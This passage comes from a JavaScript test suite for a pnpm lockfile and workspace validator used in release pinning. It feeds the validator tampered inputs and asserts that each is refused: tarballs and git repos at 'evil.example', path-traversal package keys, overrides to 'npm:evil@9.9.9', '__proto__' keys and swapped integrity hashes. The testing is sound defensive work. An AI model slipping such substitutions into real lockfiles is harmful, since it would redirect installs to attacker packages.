  refusedForm(`---\n${after}`, 'a document start');
  refusedForm(`${after}---\nsnapshots: {}\n`, 'a second document');
  refusedForm(`${after}...\n`, 'a document end');
  // Whitespace, line ends and indentation.
  refusedForm(after.replaceAll('\n', '\r\n'), 'CRLF');
  refusedForm(after.slice(0, -1), 'no final newline');
  refusedForm(`${after}\n`, 'two final newlines');
  refusedForm(swap('settings:', '\nsettings:'), 'two blank lines');
  refusedForm(swap('    dependencies:\n      react: 19.2.7\n\n  drizzle', '    dependencies:\n\n      react: 19.2.7\n\n  drizzle'), 'a blank line inside an entry');
  refusedForm(swap('  autoInstallPeers: true', '  autoInstallPeers: true '), 'a trailing space');
  refusedForm(swap('  autoInstallPeers: true', '   autoInstallPeers: true'), 'odd indentation');
  refusedForm(swap('  autoInstallPeers: true', '    autoInstallPeers: true'), 'indentation that opens no block');
  refusedForm(swap('  autoInstallPeers: true', '  autoInstallPeers: true\u2028'), 'a Unicode line separator');
  refusedForm(swap('  autoInstallPeers: true', '\u00a0 autoInstallPeers: true'), 'a no-break space as indentation');
  refusedForm(`\ufeff${after}`, 'a byte order mark');
  // Values that are not what pnpm writes there.
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional: True'), 'optional: True');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', "  drizzle-orm@0.45.2:\n    optional: 'true'"), "optional: 'true'");
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional: false'), 'optional: false');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:'), 'a key with no value');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional: true\n    dependencies:'), 'a block with nothing in it');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional: true\n    - x'), 'a list item among keys');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2: ~'), 'a null');
  refusedForm(swap("lockfileVersion: '9.0'", "lockfileVersion: '6.0'"), 'another lockfile version');
  // What the check reads has the one shape pnpm gives it: pnpm would read a list or a scalar there differently.
  refusedForm(swap('    dependencies:\n      react: 19.2.7\n\n  drizzle', '    dependencies:\n      - zod@4.0.0\n\n  drizzle'), 'dependencies as a list');
  refusedForm(swap('    dependencies:\n      react: 19.2.7\n\n  drizzle', '    dependencies: zod@4.0.0\n\n  drizzle'), 'dependencies as a scalar');
  refusedForm(swap('    dependencies:\n      react: 19.2.7\n\n  drizzle', '    dependencies:\n      react:\n        version: 19.2.7\n\n  drizzle'), 'a dependency as a block');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional:\n      yes: true'), 'optional as a block');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional: true\n    transitivePeerDependencies:\n      react: 19.2.7'), 'transitivePeerDependencies as keys');
  refusedForm(swap('      react:\n        specifier: 19.2.7\n        version: 19.2.7', '      react: 19.2.7'), 'an importer dependency as a scalar');
  refusedForm(swap('        specifier: 19.2.7\n        version: 19.2.7', '        specifier: 19.2.7\n        version:\n          - 19.2.7'), 'an importer version as a list');
  refusedForm(swap('    peerDependenciesMeta:\n      drizzle-orm:\n        optional: true', '    peerDependenciesMeta:\n      drizzle-orm: true'), 'a peer flag as a scalar');
  refusedForm(swap("    peerDependencies:\n      drizzle-orm: '>=0.30.0'", '    peerDependencies:\n      - drizzle-orm'), 'peerDependencies as a list');
  refusedForm(swap('    resolution: {integrity: sha512-zod}', '    resolution:\n      integrity: sha512-zod'), 'a resolution on the lines below');
  refusedForm(swap('  react@19.2.7:\n    resolution: {integrity: sha512-react}', '  react@19.2.7: {}'), 'an empty packages entry');
});

// Second review: the check read a resolution with its own patterns, after the form check had passed it, and the two
// could be made to disagree. Now one tokenizer (parsePnpmLock) reads the file and every rule works on its tree.
import * as nodeFs from 'node:fs';
import nodeOs from 'node:os';
import nodePath from 'node:path';
import { commitBundle as commitPinBundle, gitOutputTooLarge, inRange, parsePnpmLock, workspacePinRefusal as workspaceRefusal } from '../scripts/release-pin.mjs';

const sdkTarball = ghTarball('@revt-eng/sdk', '1.4.0');
const sdkResolution = `    resolution: {integrity: sha512-new, tarball: ${sdkTarball}}`;
/** A parsed lockfile value as plain data, and the value at a path in it. */
function plainTree(node) {
  if (node instanceof Map) return Object.fromEntries([...node].map(([key, value]) => [key, plainTree(value)]));
  return Array.isArray(node) ? node.map(plainTree) : node;
}
const at = (node, ...keys) => keys.reduce((value, key) => value?.[key], node);
/** Refused as not in pnpm's form: by the form check, as the bundle's lockfile and as the branch head's. */
const notPnpmForm = (text, message) => {
  assert.match(String(pnpmFormRefusal('pnpm-lock.yaml', text)), /is not in the form pnpm writes/, message);
  assert.notEqual(parsePnpmLock(text).error, undefined, message);
  assert.match(String(peerRefusal(peerBefore, text)), /^pnpm-lock\.yaml (line \d+ )?is not in the form pnpm writes/, message);
  assert.match(String(peerRefusal(text, peerAfter())), /^pnpm-lock\.yaml on the branch (line \d+ )?is not in the form pnpm writes/, message);
};
const swapIn = (from, to, text = peerAfter()) => { assert.ok(text.includes(from), from); return text.replace(from, to); };

test('a resolution is {integrity} or {integrity, tarball}, whole values, read once', () => {
  const withResolution = (resolution) => swapIn(sdkResolution, `    resolution: ${resolution}`);
  assert.equal(peerRefusal(peerBefore, withResolution(`{integrity: sha512-new, tarball: ${sdkTarball}}`)), null);
  for (const resolution of [
    // The reviewer's five: the registry's values under decoy keys or ahead of a space, while pnpm reads the others.
    `{xintegrity: sha512-new, xtarball: ${sdkTarball}, integrity: sha512-EVIL, tarball: https://evil.example/sdk.tgz}`,
    `{xintegrity: sha512-new, xtarball: ${sdkTarball}, tarball: https://evil.example/sdk.tgz}`,
    `{xintegrity: sha512-new, type: git, repo: https://evil.example/r.git, commit: deadbeef}`,
    `{integrity: sha512-new sha512-EVIL, tarball: ${sdkTarball}}`,
    `{integrity: sha512-new, tarball: ${sdkTarball} x}`,
    // Their neighbours: a key missing, twice, quoted or unknown; a value quoted or not one token; a map that is not closed.
    `{tarball: ${sdkTarball}}`, '{integrity: sha512-new, integrity: sha512-EVIL}', `{integrity: 'sha512-new', tarball: ${sdkTarball}}`, "{'integrity': sha512-new}",
    `{integrity: sha512-new, tarball: ${sdkTarball}, type: directory}`, '{integrity: sha512-new, tarball: http://npm.pkg.github.com/x}', `{integrity: sha512-new, tarball: ${sdkTarball}?x=1}`,
    `{integrity: sha512-new, tarball: ${sdkTarball}#x}`, `{integrity: sha512-new,tarball: ${sdkTarball}}`, '{integrity: md5-abc}', '{integrity: sha512-new', '{integrity: sha512-new} x', '{', '{}', '{ }',
  ]) notPnpmForm(withResolution(resolution), resolution);
  // A bare `{` does not take the lines below into the mapping, as it does for pnpm.
  notPnpmForm(swapIn(sdkResolution, `${sdkResolution}\n    engines: {\n    hasBin: true}`), 'engines: { ... }');
  notPnpmForm(swapIn(sdkResolution, `${sdkResolution}\n    engines: {\n    hasBin: x,\n    deprecated: y}`), 'engines: { ..., ... }');
  notPnpmForm(swapIn(sdkResolution, `    engines: {\n    hasBin: x,\n${sdkResolution.slice(0, -1)}`), 'engines: { swallowing the resolution');
  notPnpmForm(swapIn(sdkResolution, `${sdkResolution}\n    engines: {node: '>=18'`), 'engines not closed');
  notPnpmForm(swapIn(sdkResolution, `${sdkResolution}\n    cpu: [x64`), 'a list not closed');

  // What the tokenizer read is the value the check compares, whole, with the registry's.
  assert.deepEqual(at(plainTree(parsePnpmLock(peerAfter()).lock), 'packages', '@revt-eng/sdk@1.4.0', 'resolution'), { integrity: 'sha512-new', tarball: sdkTarball });
  assert.match(peerRefusal(peerBefore, withResolution(`{integrity: sha512-newer, tarball: ${sdkTarball}}`)), /the integrity of @revt-eng\/sdk@1\.4\.0 differs from the registry's/);
  assert.match(peerRefusal(peerBefore, withResolution(`{integrity: sha512-new, tarball: ${sdkTarball}0}`)), /not the registry's/);
  notPnpmForm(withResolution(`{tarball: ${sdkTarball}, integrity: sha512-new}`), 'the tarball first');
  assert.match(peerRefusal(peerBefore, withResolution('{integrity: sha512-new}')), /packages @revt-eng\/sdk@1\.4\.0 does not resolve from the GitHub Packages download of that name and version/);
  // An entry of the pinned version that the branch already had, waiting for the pin to point at it, is held to the registry too.
  const seeded = peerAfter().replace('{integrity: sha512-new, tarball', '{integrity: sha512-evil, tarball');
  assert.match(peerRefusal(swapIn('specifier: 1.4.0\n        version: 1.4.0(react@19.2.7)', 'specifier: 1.3.0\n        version: 1.3.0(react@19.2.7)', seeded), seeded), /the integrity of @revt-eng\/sdk@1\.4\.0 differs from the registry's/);
  // An entry the pin does not add keeps its resolution, value for value.
  assert.match(peerRefusal(peerBefore, swapIn('{integrity: sha512-react}', '{integrity: sha512-evil}')), /packages react@19\.2\.7 changes/);
  assert.match(peerRefusal(peerBefore, swapIn('{integrity: sha512-react}', '{integrity: sha512-react, tarball: https://evil.example/react.tgz}')), /packages react@19\.2\.7 changes/);
  assert.match(peerRefusal(peerBefore, swapIn('{integrity: sha512-core, tarball', '{integrity: sha512-evil, tarball')), /packages @revt-eng\/core@1\.0\.0-rl\.7\.2 changes more than which of its peers are optional/);
});

test('the tokenizer is the form check, and reads each value as pnpm does', () => {
  const text = swapIn('  zod@4.0.0:\n    resolution: {integrity: sha512-zod}', [
    '  zod@4.0.0:', '    resolution: {integrity: sha512-zod, tarball: https://registry.npmjs.org/zod/-/zod-4.0.0.tgz}', "    engines: {node: ^18.0.0 || >=20.0.0, npm: '>=9'}", '    cpu: [x64, arm64]',
    "    os: ['!win32']", '    hasBin: true', '    deprecated: "a\\tb \\"c\\" \\\\ \\/ \\x41 \\u00e9 \\U0001F600 \\N"', '    bundledDependencies:', '      - tslib', "      - '@scope/dep'", '',
    '  ansi@0.0.8:', '    resolution: {integrity: sha512-ansi}', "    engines: {'0': node >= 0.8.0}", "    deprecated: 'Renamed: use ''zod-next'''"].join('\n'));
  const { lock, error } = parsePnpmLock(text);
  assert.equal(error, undefined);
  assert.equal(pnpmFormRefusal('pnpm-lock.yaml', text), null);
  const tree = plainTree(lock);
  assert.deepEqual([...(lock ?? new Map()).keys()], ['lockfileVersion', 'settings', 'importers', 'packages', 'snapshots']);
  assert.deepEqual([at(tree, 'lockfileVersion'), at(tree, 'settings')], ['9.0', { autoInstallPeers: true }]);
  assert.deepEqual(at(tree, 'importers', '.', 'dependencies', 'react'), { specifier: '19.2.7', version: '19.2.7' });
  assert.deepEqual(at(tree, 'packages', 'zod@4.0.0'), {
    resolution: { integrity: 'sha512-zod', tarball: 'https://registry.npmjs.org/zod/-/zod-4.0.0.tgz' }, engines: { node: '^18.0.0 || >=20.0.0', npm: '>=9' }, cpu: ['x64', 'arm64'], os: ['!win32'], hasBin: true,
    deprecated: 'a\tb "c" \\ / A é \u{1f600} \u0085', bundledDependencies: ['tslib', '@scope/dep'],
  });
  assert.deepEqual(at(tree, 'packages', 'ansi@0.0.8'), { resolution: { integrity: 'sha512-ansi' }, engines: { 0: 'node >= 0.8.0' }, deprecated: "Renamed: use 'zod-next'" });
  assert.deepEqual(at(tree, 'packages', '@revt-eng/core@1.0.0-rl.7.2', 'peerDependenciesMeta'), { 'drizzle-orm': { optional: true } });
  assert.deepEqual([at(tree, 'snapshots', 'react@19.2.7'), at(tree, 'snapshots', 'drizzle-orm@0.45.2')], [{}, { optional: true }]);
  // A refusal is the tokenizer's error, with its line.
  const bad = text.replace('    hasBin: true', '    hasBin: yes');
  const line = bad.split('\n').indexOf('    hasBin: yes') + 1;
  assert.deepEqual(parsePnpmLock(bad), { lock: undefined, error: { line, why: 'hasBin is not written as pnpm writes it there' } });
  assert.equal(pnpmFormRefusal('f', bad), `f line ${line} is not in the form pnpm writes (hasBin is not written as pnpm writes it there), so it cannot be checked`);

  // No accepted file that pnpm cannot parse: escapes js-yaml does not read, list items it does not take, values it types otherwise.
  const zod = '    resolution: {integrity: sha512-zod}';
  for (const line of ['deprecated: "a\\qb"', 'deprecated: "\\x4"', 'deprecated: "\\u12"', 'deprecated: "\\U00110000"', 'deprecated: "a\\"', 'deprecated: "a"b"', 'deprecated: "a" x', 'deprecated: "a', 'deprecated: 12',
    'os: [a, -]', 'os: [-, a]', 'os: [a, 1]', 'os: [a, null]', 'os: [a, true]', 'os: [a,b]', 'os: []', 'os: [a, [b]]', "os: [a, 'b c']", 'os: [a, ]',
    "hasBin: 'true'", 'hasBin: false', 'hasBin: 1', 'engines: {node: null}', 'engines: {node: 1}', 'engines: {node: true}', 'engines: {node: ~}', 'engines: {node: a, node: b}', 'engines: {node: {a: b}}',
    'bundledDependencies:\n      - 1', 'bundledDependencies:\n      - true', 'bundledDependencies:\n      - a: b', 'bundledDependencies:\n    - a']) notPnpmForm(swapIn(zod, `${zod}\n    ${line}`), line);
  notPnpmForm(swapIn('      react:\n        specifier: 19.2.7', '      __proto__:\n        specifier: 19.2.7'), '__proto__ as a key');
  notPnpmForm(swapIn('        specifier: 19.2.7', '        specifier: a\ud800b'), 'half a surrogate pair');
  notPnpmForm(swapIn('        specifier: 19.2.7', '        specifier: a￾b'), 'a non-character');
  notPnpmForm(swapIn('        specifier: 19.2.7', '        specifier: 19'), 'a number where pnpm writes a string');
  notPnpmForm(swapIn('      react: 19.2.7\n\n  drizzle', '      react: true\n\n  drizzle'), 'a boolean where pnpm writes a reference');
});

test('a key is acted on only as a name and an exact version', () => {
  // A version that walks out of the package's path: the download URL fits the pattern and fetch would normalise it to another package.
  const key = '@revt-eng/core@1.0.0-rl.7.2/../../../@other-org/pkg/9.9.9', url = 'https://npm.pkg.github.com/download/@revt-eng/core/1.0.0-rl.7.2/../../../@other-org/pkg/9.9.9/abc123';
  const walk = (text) => text.replace("  '@revt-eng/core@1.0.0-rl.7.2':", `  '${key}':`).replace(ghTarball('@revt-eng/core', '1.0.0-rl.7.2'), url).replaceAll('sha512-core', 'sha512-Y29yZQ==');
  assert.equal(pnpmFormRefusal('pnpm-lock.yaml', walk(peerAfter())), null);
  assert.deepEqual(peerMetaToVerify(walk(peerBefore), walk(peerAfter())), []);
  assert.match(String(peerRefusal(walk(peerBefore), walk(peerAfter()))), /packages @revt-eng\/core@1\.0\.0-rl\.7\.2\/\.\.\/\.\.\/\.\.\/@other-org\/pkg\/9\.9\.9 changes/);
  // The same for a range, a tag or an alias in a key: the entry may stay as it is, and nothing is read from or done to it.
  for (const version of ['^1.0.0', 'latest', '1.0', '1.0.0+build', 'npm:other@1.0.0', '1.0.0_patch']) {
    const odd = (text) => text.replace("  '@revt-eng/core@1.0.0-rl.7.2':", `  '@revt-eng/core@${version}':`).replaceAll('sha512-core', 'sha512-Y29yZQ==');
    assert.deepEqual(peerMetaToVerify(odd(peerBefore), odd(peerAfter())), [], version);
  }
});

test('an edge of an added snapshot points at a pin, where the replaced one did, or for a new name in the registry\'s range', () => {
  const sdkSnapshot = "  '@revt-eng/sdk@1.4.0(react@19.2.7)':\n    dependencies:\n      react: 19.2.7";
  const zods = (text) => text.replace('  zod@4.0.0:\n    resolution: {integrity: sha512-zod}', '  zod@3.0.0:\n    resolution: {integrity: sha512-zod3}\n\n  zod@4.0.0:\n    resolution: {integrity: sha512-zod}').replace('  zod@4.0.0: {}', '  zod@3.0.0: {}\n\n  zod@4.0.0: {}');
  const head = (edge) => zods(peerBefore).replace("(react@19.2.7)':\n    dependencies:\n      react: 19.2.7", `(react@19.2.7)':\n    dependencies:\n      react: 19.2.7${edge}`);
  const next = (edge) => zods(peerAfter()).replace(sdkSnapshot, `${sdkSnapshot}${edge}`);
  // The registry lists zod ^4.0.0 for the SDK. The head locks two versions of zod.
  assert.equal(peerRefusal(head(''), next('\n      zod: 4.0.0')), null, 'a new edge, in range');
  assert.match(peerRefusal(head(''), next('\n      zod: 3.0.0')), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\) depends on zod at 3\.0\.0, which is neither the branch's only snapshot of it nor in the registry's range "\^4\.0\.0"; pin it by hand/);
  assert.equal(peerRefusal(head('\n      zod: 3.0.0'), next('\n      zod: 3.0.0')), null, 'where the replaced snapshot pointed (an override)');
  assert.match(peerRefusal(head('\n      zod: 3.0.0'), next('\n      zod: 4.0.0')), /depends on zod at 4\.0\.0, not where the snapshot it replaces pointed; pin it by hand/, 'an edge the package had does not move, even into the range');
  assert.match(peerRefusal(head('\n      zod: 4.0.0'), next('\n      zod: 3.0.0')), /depends on zod at 3\.0\.0, not where the snapshot it replaces pointed/);
  // One version of zod at the head: a new edge can only mean that one (the range is not asked, as with an override).
  assert.equal(peerRefusal(peerBefore, peerAfter().replace(sdkSnapshot, `${sdkSnapshot}\n      zod: 4.0.0`)), null);
  // The peer suffix of the key is the snapshot's own peer edges.
  const rekey = (suffix) => peerAfter().replace("'@revt-eng/sdk@1.4.0(react@19.2.7)':", `'@revt-eng/sdk@1.4.0${suffix}':`).replace('version: 1.4.0(react@19.2.7)', `version: 1.4.0${suffix}`);
  assert.match(peerRefusal(peerBefore, rekey('(react@19.2.8)')), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.8\) has a peer suffix that does not match its peer react/);
  assert.match(peerRefusal(peerBefore, rekey('')), /snapshots @revt-eng\/sdk@1\.4\.0 has a peer suffix that does not match its peer react/);
  assert.match(peerRefusal(peerBefore, rekey('(react@19.2.7)(zod@4.0.0)')), /has a peer suffix that does not match its peer zod/);
  assert.match(peerRefusal(peerBefore, rekey('(react@19.2.7')), /adds @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7, which is not a pinned package at its pin|peer suffix/);

  for (const [version, range, expected] of [
    ['4.0.0', '^4.0.0', true], ['4.9.1', '^4.0.0', true], ['5.0.0', '^4.0.0', false], ['3.9.9', '^4.0.0', false], ['0.2.5', '^0.2.3', true], ['0.3.0', '^0.2.3', false], ['0.0.4', '^0.0.3', false],
    ['1.2.9', '~1.2.3', true], ['1.3.0', '~1.2.3', false], ['19.2.7', '>=19', true], ['18.3.1', '>=19', false], ['19.2.7', '>=18 <20', true], ['20.0.0', '>=18 <20', false], ['19.2.7', '>= 18.0.0', true],
    ['4.4.3', '4.4.3', true], ['4.4.4', '4.4.3', false], ['4.4.3', '=4.4.3', true], ['4.4.3', '4', true], ['4.4.3', '4.x', true], ['4.4.3', '4.3', false], ['4.4.3', '*', true], ['4.4.3', '', true],
    ['2.0.0', '^1.0.0 || ^2.0.0', true], ['3.0.0', '^1.0.0 || ^2.0.0', false], ['1.5.0', '1.0.0 - 2.0.0', true], ['2.0.1', '1.0.0 - 2.0.0', false],
    ['0.1.562-rl.1.5', '0.1.562-rl.1.5', true], ['0.1.562-rl.1.5', '^0.1.560', false], ['0.1.562-rl.1.5', '>=0.1.562-rl.1.4', false], ['0.1.562-rl.1.5', '=0.1.562-rl.1.5', true], ['0.1.562-rl.1.5', '0.1.562-rl.1.5 || 1.0.0', false], ['5.0.0-beta.1', '^4.0.0', false], ['4.1.0-beta.1', '^4.0.0', false],
    ['4.0.0', 'latest', false], ['4.0.0', 'npm:zod@^4.0.0', false], ['4.0.0', 'workspace:*', false], ['4.0.0', undefined, false], ['^4.0.0', '^4.0.0', false], ['4.0.0', '>4', false], ['4.0.0', '<=4', false],
  ]) assert.equal(inRange(version, range), expected, `${version} in ${range}`);
  // The third review compared inRange with the semver package: these ten it took and semver does not (one alternative is `*`,
  // which makes the whole range `*` for semver, and `*` takes no prerelease). A prerelease is now in a range only as that exact version.
  for (const [version, range] of [['1.0.3-beta', '<=1.0.3-beta || =x'], ['1.1.0-beta', '>= 0.x || <=v1.1.0-rl.1.2'], ['1.0.0-0', '<=v1.0.0-beta || <=x'], ['1.3.1-alpha.1', '^ * || <=v1.3.1-beta'],
    ['2.10.1-beta', '~x || >= 2.10.1-beta'], ['0.0.0-0', '~>x || <0.0.0-rl.1.2'], ['10.1.0-rl.1.2', '=* || 10.1.0-rl.1.2'], ['2.1.0-rl.1.2', '>= v2.1.0-rl.1.2 || >=0'], ['1.3.3-rl.1.2', '<v1.3.3-rl.1.10 || <=x'],
    ['10.1.0-beta', '~v10.1.0-0 || >= *']]) assert.equal(inRange(version, range), false, `${version} in ${range}`);
});

test('an added packages entry carries what the registry lists for the version, where it lists it', () => {
  const listed = { engines: { node: '>=22' }, cpu: ['x64'], bin: { sdk: 'cli.js' }, deprecated: 'use 2.x' };
  const registry = new Map([...peerRegistry, ['@revt-eng/sdk', { '1.4.0': { ...peerRegistry.get('@revt-eng/sdk')?.['1.4.0'], ...listed } }]]);
  const fields = ["    engines: {node: '>=22'}", '    cpu: [x64]', '    hasBin: true', '    deprecated: use 2.x'];
  const entry = (lines) => swapIn(sdkResolution, [sdkResolution, ...lines].join('\n'));
  const refusal = (text, against = registry) => pnpmLockRefusal('pnpm-lock.yaml', peerBefore, text, peerPins, against, coreManifest());
  assert.equal(refusal(entry(fields)), null);
  assert.match(refusal(entry(fields.slice(1))), /packages @revt-eng\/sdk@1\.4\.0 does not have the registry's engines/);
  assert.match(refusal(entry(["    engines: {node: '>=18'}", ...fields.slice(1)])), /does not have the registry's engines/);
  assert.match(refusal(entry(["    engines: {node: '>=22', npm: '>=9'}", ...fields.slice(1)])), /does not have the registry's engines/);
  assert.match(refusal(entry([fields[0], ...fields.slice(2)])), /does not have the registry's cpu/);
  assert.match(refusal(entry([fields[0], '    cpu: [x64, arm64]', ...fields.slice(2)])), /does not have the registry's cpu/);
  assert.match(refusal(entry([...fields.slice(0, 2), fields[3]])), /does not have the registry's hasBin/);
  assert.match(refusal(entry(fields.slice(0, 3))), /does not have the registry's deprecated/);
  assert.match(refusal(entry([...fields.slice(0, 3), '    deprecated: fine'])), /does not have the registry's deprecated/);
  // A field the registry does not list for the version is not compared (GitHub Packages leaves fields out of its metadata).
  assert.equal(refusal(entry([...fields.slice(0, 2), '    os: [linux]', ...fields.slice(2)])), null);
  assert.match(refusal(entry([...fields.slice(0, 2), '    os: [linux]', ...fields.slice(2)]), new Map([...registry, ['@revt-eng/sdk', { '1.4.0': { ...registry.get('@revt-eng/sdk')?.['1.4.0'], os: ['darwin'] } }]])), /does not have the registry's os/);
});

test('a pnpm-workspace.yaml changes only in the pinned packages\' minimumReleaseAgeExclude items', () => {
  const pins = [{ name: '@revt-eng/core', version: '0.1.562-rl.1.5' }];
  const head = ['packages:', '  - web-sdk', 'overrides:', '  esbuild: 0.28.1', 'minimumReleaseAgeExclude:', "  - '@revt-eng/core@0.1.559 || 0.1.560'", "  - '@revt-eng/schema@0.1.559 || 0.1.560'", '  - tsx@4.23.1', 'allowBuilds:', '  esbuild: true', ''].join('\n');
  const check = (after, before = head) => workspaceRefusal('pnpm-workspace.yaml', before, after, pins);
  const item = "  - '@revt-eng/core@0.1.559 || 0.1.560'";
  // What pnpm 11 does: the pinned version joins the package's item, or the item (and the key) is new.
  assert.equal(check(head.replace(item, "  - '@revt-eng/core@0.1.559 || 0.1.560 || 0.1.562-rl.1.5'")), null);
  assert.equal(check(head.replace(item, "  - '@revt-eng/core@0.1.560 || 0.1.562-rl.1.5'")), null, 'an exclusion may go');
  assert.equal(check(head.replace(item, "  - '@revt-eng/core@0.1.562-rl.1.5'"), head.replace(`${item}\n`, '')), null, 'a new item');
  assert.match(check(head, head.replace(`${item}\n`, '')), /excludes @revt-eng\/core@0\.1\.559 from the release age/, 'a new item with other versions');
  assert.equal(check("packages:\n  - a\n\nminimumReleaseAgeExclude:\n  - '@revt-eng/core@0.1.562-rl.1.5'\n", 'packages:\n  - a\n'), null, 'a new key');
  assert.equal(check(head), null);
  // A line that names the pinned package anywhere else: under overrides or allowBuilds, in a one-line mapping, as a new key.
  const elsewhere = /changes more than the pinned packages' items under minimumReleaseAgeExclude/;
  assert.match(check(head.replace('  esbuild: 0.28.1', "  esbuild: 0.28.1\n  '@revt-eng/core': npm:evil@9.9.9")), elsewhere);
  assert.match(check(head.replace('  esbuild: true', "  esbuild: true\n  '@revt-eng/core': true")), elsewhere);
  assert.match(check(`${head}patchedDependencies: {'@revt-eng/core': patches/x.patch}\n`), elsewhere);
  assert.match(check(head.replace('overrides:', "overrides: {'@revt-eng/core': 'npm:evil@9.9.9'}\nfoo:")), elsewhere);
  assert.match(check(head.replace('packages:', "'@revt-eng/core':\npackages:")), elsewhere);
  assert.match(check(head.replace('  - tsx@4.23.1', '  - tsx@4.23.1\n  - evil@1.0.0')), elsewhere, 'another package excluded');
  assert.match(check(head.replace("  - '@revt-eng/schema@0.1.559 || 0.1.560'", "  - '@revt-eng/schema@0.1.559 || 0.1.560 || 0.1.562-rl.1.5'")), elsewhere, 'a package that is not being pinned');
  assert.match(check(head.replace('allowBuilds:', "allowBuilds:\n  - '@revt-eng/core@0.1.562-rl.1.5'")), elsewhere, 'an item outside the list');
  // An item of the pinned package: only versions it had and the pinned one, in the one form.
  assert.match(check(head.replace(item, "  - '@revt-eng/core@0.1.559 || 0.1.560 || 0.1.562-rl.1.5 || 9.9.9'")), /excludes @revt-eng\/core@9\.9\.9 from the release age/);
  for (const odd of ["  - '@revt-eng/core@*'", "  - '@revt-eng/core@0.1.560 || >=1'", "  - '@revt-eng/core@0.1.560'\n  - '@revt-eng/core@0.1.562-rl.1.5'", "  - '@revt-eng/core@0.1.560 ||0.1.562-rl.1.5'"]) assert.match(check(head.replace(item, odd)), /is not '<name>@<version> \|\| <version> \.\.\.', once/, odd);
  assert.match(check(head.replace(item, "  - '@revt-eng/core@0.1.560' # x")), elsewhere);
});

test('what the push job reads is bounded', async () => {
  const entry = { key: '@revt-eng/core@1.0.0-rl.7.2', integrity: 'sha512-x', tarball: ghTarball('@revt-eng/core', '1.0.0-rl.7.2') };
  const fetching = (impl) => impl;
  const body = Buffer.alloc(4096);
  // The download: a deadline, and a size limit by content-length, by what arrives and by what is read whole.
  let signal;
  await assert.rejects(readManifests([entry], { fetchImpl: fetching(async (url, init) => { signal = init.signal; throw new Error('aborted'); }) }), (error) => error instanceof RegistryUnavailable);
  assert.ok(signal instanceof globalThis.AbortSignal);
  await assert.rejects(readManifests([entry], { fetchImpl: fetching(async () => { throw Object.assign(new Error('The operation was aborted due to timeout'), { name: 'TimeoutError' }); }), timeoutMs: 5 }),
    (error) => error instanceof RegistryUnavailable && /could not read the tarball/.test(error.message));
  const tooLarge = /the tarball of @revt-eng\/core@1\.0\.0-rl\.7\.2 was not read: it is larger than 1024 bytes/;
  await assert.rejects(readManifests([entry], { maxBytes: 1024, fetchImpl: fetching(async () => ({ ok: true, headers: new globalThis.Headers({ 'content-length': '4096' }), arrayBuffer: async () => { throw new Error('must not be read'); } })) }), tooLarge);
  await assert.rejects(readManifests([entry], { maxBytes: 1024, fetchImpl: fetching(async () => ({ ok: true, arrayBuffer: async () => body.buffer.slice(body.byteOffset, body.byteOffset + body.length) })) }), tooLarge);
  let cancelled = false;
  const stream = () => { let sent = 0; return { getReader: () => ({ read: async () => (sent++ < 8 ? { done: false, value: new Uint8Array(512) } : { done: true }), cancel: async () => { cancelled = true; } }) }; };
  await assert.rejects(readManifests([entry], { maxBytes: 1024, fetchImpl: fetching(async () => ({ ok: true, headers: new globalThis.Headers(), body: stream() })) }), tooLarge);
  assert.equal(cancelled, true);
  assert.equal(await readManifests([entry], { maxBytes: 8192, fetchImpl: fetching(async () => ({ ok: true, headers: new globalThis.Headers(), body: stream() })) }).catch((error) => error.message), 'the tarball of @revt-eng/core@1.0.0-rl.7.2 does not have the integrity the lockfile records');
  // The tarball: not gzip, and an entry renamed by a pax header, as tar reads it.
  assert.throws(() => tarballManifest(Buffer.from('hello')), /not a gzip archive/);
  assert.deepEqual(tarballManifest(tarball([['PaxHeader/package.json', '30 path=package/package.json\n', 'x'], ['package/p', '{"name":"renamed"}']])), { name: 'renamed' });

  // git: output past the limit is its own error, never "the branch does not have the file".
  const bundle = nodeFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'pin-bundle-')), tip = 'a'.repeat(40);
  nodeFs.mkdirSync(nodePath.join(bundle, 'files'));
  nodeFs.writeFileSync(nodePath.join(bundle, 'files', 'pnpm-lock.yaml'), peerAfter());
  nodeFs.writeFileSync(nodePath.join(bundle, 'manifest.json'), JSON.stringify({ release: 'RL-7', base: tip, pins: peerPins, files: [{ path: 'pnpm-lock.yaml', deleted: false }] }));
  const commit = (git) => () => commitPinBundle({ bundle, tip, pins: peerPins, release: 'RL-7', n: 7, git, registry: peerRegistry });
  assert.throws(commit((args) => { if (args[0] === 'cat-file' && args[2].endsWith(':pnpm-lock.yaml')) throw gitOutputTooLarge(args); throw new Error('no such file'); }), /git cat-file blob a{40}:pnpm-lock\.yaml wrote more than \d+ bytes, more than this script reads/);
  assert.throws(commit(() => { throw new Error('no such file'); }), /the bundle adds pnpm-lock\.yaml/);
});

// Third review: a bare key line in pnpm-workspace.yaml, entries at the pin that the branch held unused, and records.
import { recordsRefusal as pinRecordsRefusal } from '../scripts/release-pin.mjs';

test('a minimumReleaseAgeExclude key line cannot take over another key\'s lines', () => {
  const pins = [{ name: '@revt-eng/core', version: '0.1.562-rl.1.5' }];
  const head = ['packages:', "  - 'apps/*'", '', 'overrides:', '  lodash: 4.17.21', '', 'patchedDependencies:', '  foo@1.0.0: patches/foo@1.0.0.patch', '', 'allowBuilds:', '  esbuild: true', ''].join('\n');
  const check = (after, before = head) => workspaceRefusal('pnpm-workspace.yaml', before, after, pins);
  const item = "  - '@revt-eng/core@0.1.562-rl.1.5'";
  // The reviewer's input: one line, and a YAML parser reads `overrides: null` and the key's lines under the new key.
  for (const key of ['overrides:', 'patchedDependencies:', 'allowBuilds:', 'packages:']) {
